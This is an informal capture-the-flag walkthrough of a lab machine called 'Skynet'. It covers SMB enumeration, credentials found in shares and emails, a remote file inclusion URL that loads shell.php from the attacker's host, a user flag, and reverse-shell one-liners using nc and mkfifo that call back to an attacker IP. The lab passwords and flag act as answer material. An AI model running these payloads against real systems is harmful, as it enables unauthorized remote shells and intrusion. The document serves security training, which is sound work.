### Skynet ###

export IP=10.10.186.16


nmap showed a bunch of ports open....
gobuster showed few common dirs like /css or /js

but all were forbidden so no luck there...
nmap showed that guest login was allowed but i didnt know how so here is an example:

# Samba:

smbclient -L $IP

if anonymous share is there:

smbclient //$IP/anonymous -U USERNAME(guest) -p [PORT]

found attention.txt:username:-Miles Dyson

found a log file....contains a bunch of passwords i guess...one of them is:
cyborg007haloterminator (for miles)

# telnet:

telnet [IP] [PORT]

currently plaintext authentication is not allowed so finding another way...apparently gobuster didnt find /suirrelmail...which was the login required :/.....

Unknown user or password incorrect.

nvrmind logged in as milesdyson:pass fund earliear(milesdyson came from smb because it contained a smbshare)

Found three emails:

# 1.
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to

# 2.
balls have zero to me to me to me to me to me to me to me to me to

# 3.


We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`

found the insannneeeee library of machine learning models lololol....

found important.txt:hidden dir:/45kra24zxs28v3yd


alerts/alertConfigField.php?urlConfig=http://10.11.18.102:8000/shell.php

# User.txt:
7ce5c2109a40f958099283600a9ae807

nc -e /bin/sh 10.11.18.102 7000

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.18.102 7000 >/tmp/f" > html/shell.sh